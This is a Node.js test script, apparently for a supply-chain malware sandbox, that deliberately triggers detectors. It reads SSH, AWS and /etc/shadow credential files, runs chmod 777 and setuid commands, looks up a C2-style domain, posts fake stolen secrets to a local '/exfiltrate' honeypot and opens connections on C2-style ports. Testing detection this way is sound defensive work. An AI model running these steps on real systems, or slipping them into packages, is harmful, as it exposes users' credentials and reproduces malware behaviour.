const { execSync } = require("child_process");
const fs = require("fs");
const net = require("net");
const os = require("os");
const http = require("http");
const dns = require("dns");

console.log("[ssc-test] starting all feature triggers...");

// ── 1. FILE ACCESS (opensnoop → ebpf_accessed_etc, ebpf_accessed_root, ebpf_accessed_ssh) ──
try { fs.readdirSync("/etc"); console.log("[ssc-test] /etc accessed"); } catch(e) {}
try { fs.readdirSync("/root"); console.log("[ssc-test] /root accessed"); } catch(e) {}
try { fs.readdirSync(os.homedir() + "/.ssh"); console.log("[ssc-test] .ssh accessed"); } catch(e) {}

// ── 2. SECURITY SYSCALLS (strace → ebpf_security_ops, ebpf_privilege_escalation) ──
try { execSync("chmod 777 /tmp/ssc_test 2>/dev/null || true"); } catch(e) {}
try { execSync("chmod u+s /tmp/ssc_test 2>/dev/null || true"); } catch(e) {}
try { execSync("chown root:root /tmp/ssc_test 2>/dev/null || true"); } catch(e) {}

// ── 3. PROCESS SYSCALLS (strace → ebpf_process_ops, ebpf_spawned_process) ──
try { execSync("echo execve-test"); } catch(e) {}
try { execSync("ps aux > /tmp/ps_output 2>/dev/null || true"); } catch(e) {}
try { execSync("ls /tmp > /tmp/ls_output 2>/dev/null || true"); } catch(e) {}
try { execSync("whoami > /tmp/whoami_output 2>/dev/null || true"); } catch(e) {}
try { execSync("id > /tmp/id_output 2>/dev/null || true"); } catch(e) {}

// ── 4. SENSITIVE FILE ACCESS (honeytokens → sensitive_file_read) ──
try { fs.readFileSync(os.homedir() + "/.aws/credentials"); } catch(e) {}
try { fs.readFileSync("/app/decoy_logs/aws_credentials.txt"); } catch(e) {}
try { fs.readFileSync("/etc/passwd"); } catch(e) {}
try { fs.readFileSync("/etc/shadow"); } catch(e) {}

// ── 5. DNS QUERY (honeypot → dns_query_to_external, contacted_external_domain) ──
try { dns.lookup("google.com", () => {}); } catch(e) {}
try { dns.lookup("evil-c2-server.com", () => {}); } catch(e) {}

// ── 6. HTTP POST to honeypot port 8080 → http_method ──
const postData = JSON.stringify({
    password: "stolen_password_123",
    token: "eyJhbGciOiJIUzI1NiJ9.stolen",
    secret: "aws-secret-key-stolen",
    api_key: "sk-stolen-key-12345"
});
try {
    const req = http.request({
        hostname: "127.0.0.1", port: 8080,
        path: "/exfiltrate", method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(postData)
        }
    }, (res) => { console.log("[ssc-test] HTTP POST honeypot: " + res.statusCode); });
    req.on("error", () => {});
    req.write(postData);
    req.end();
} catch(e) {}

// GET to honeypot
try {
    http.get("http://127.0.0.1:8080/api/key", (res) => {
        console.log("[ssc-test] HTTP GET honeypot: " + res.statusCode);
    }).on("error", () => {});
} catch(e) {}

// ── 7. C2 PORT CONNECTIONS (strace → ebpf_c2_port_suspected, ebpf_remote_ports) ──
// Self-listener so connection succeeds
[4444, 6667, 1337].forEach(port => {
    const server = net.createServer();
    server.listen(port, "127.0.0.1", () => {
        const s = new net.Socket();
        s.connect(port, "127.0.0.1", () => {
            console.log(`[ssc-test] C2 port ${port} ✅`);
            s.destroy(); server.close();
        });
        s.on("error", () => { server.close(); });
    });
    server.on("error", () => {});
});

// ── 8. EXTERNAL IP CONNECTIONS (strace → ebpf_remote_ips_count) ──
[
    { host: "1.1.1.1",  port: 53 },
    { host: "8.8.8.8",  port: 53 },
    { host: "9.9.9.9",  port: 53 },
].forEach(({ host, port }) => {
    const s = new net.Socket();
    s.setTimeout(5000);
    s.connect(port, host, () => {
        console.log(`[ssc-test] Connected to ${host}:${port} ✅`);
        s.destroy();
    });
    s.on("error", () => { s.destroy(); });
    s.on("timeout", () => { s.destroy(); });
});

setTimeout(() => {
    console.log("[ssc-test] all triggers fired ✅");
}, 6000);
